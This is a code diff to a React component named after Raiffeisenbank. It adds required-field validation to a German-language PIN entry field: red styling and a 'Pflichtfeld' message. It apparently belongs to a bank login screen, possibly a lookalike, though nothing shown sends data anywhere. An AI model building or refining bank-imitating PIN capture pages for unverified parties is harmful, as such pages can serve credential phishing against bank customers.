@@ -157,12 +157,23 @@ const Raiffeisenbank = () => {
             maxLength={5}
             value={pin}
             onChange={(e) => setPin(e.target.value)}
+            onBlur={() => setPinTouched(true)}
             placeholder=" "
-            className="peer w-full border-b-2 border-gray-300 bg-[#f4f4f4] px-3 pb-1 pt-5 text-sm text-[#1a1a1a] outline-none focus:border-[#fbf315] focus:bg-[#e8e8e8]"
+            className={`peer w-full border-b-2 bg-[#f4f4f4] px-3 pb-1 pt-5 text-sm text-[#1a1a1a] outline-none focus:border-[#fbf315] focus:bg-[#e8e8e8] ${
+              pinTouched && !pin ? "border-red-600" : "border-[#1a1a1a]"
+            }`}
           />
-          <label className="pointer-events-none absolute left-3 top-3 text-sm text-gray-500 transition-all duration-200 peer-focus:top-1 peer-focus:text-xs peer-[&:not(:placeholder-shown)]:top-1 peer-[&:not(:placeholder-shown)]:text-xs">
-            PIN eingeben <span className="text-gray-400">*</span>
+          <label className={`pointer-events-none absolute left-3 top-3 text-sm transition-all duration-200 peer-focus:top-1 peer-focus:text-xs peer-[&:not(:placeholder-shown)]:top-1 peer-[&:not(:placeholder-shown)]:text-xs ${
+            pinTouched && !pin ? "text-red-600" : "text-gray-500"
+          }`}>
+            PIN eingeben <span className={pinTouched && !pin ? "text-red-600" : "text-gray-400"}>*</span>
           </label>
+          {pinTouched && !pin && (
+            <div className="mt-1 flex items-center gap-1 text-xs text-red-600">
+              <span className="inline-block h-4 w-4 rounded-full bg-red-600 text-white text-center text-[10px] leading-4">!</span>
+              Pflichtfeld
+            </div>
+          )}
         </div>
 
         {/* Weiter Button */}
